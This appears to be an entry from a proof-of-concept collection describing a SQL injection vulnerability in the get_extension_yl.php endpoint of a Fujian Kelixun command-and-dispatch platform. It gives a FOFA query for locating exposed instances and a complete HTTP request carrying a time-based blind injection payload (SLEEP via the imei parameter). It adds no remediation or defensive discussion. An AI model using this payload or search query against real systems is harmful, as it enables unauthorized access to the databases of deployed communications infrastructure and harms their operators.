## 福建科立讯通信指挥调度平台get_extension_yl.php存在sql注入漏洞

## fofa
```
body="app/structure/departments.php"||app="指挥调度管理平台"
```
## poc
```
GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(5)))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: authcode=h8g9
Upgrade-Insecure-Requests: 1
```

![3973d557bffaa4172f8077fe5f50f364](https://github.com/wy876/POC/assets/139549762/ec6a38f0-74ff-4be7-a668-f1af3aa0722c)
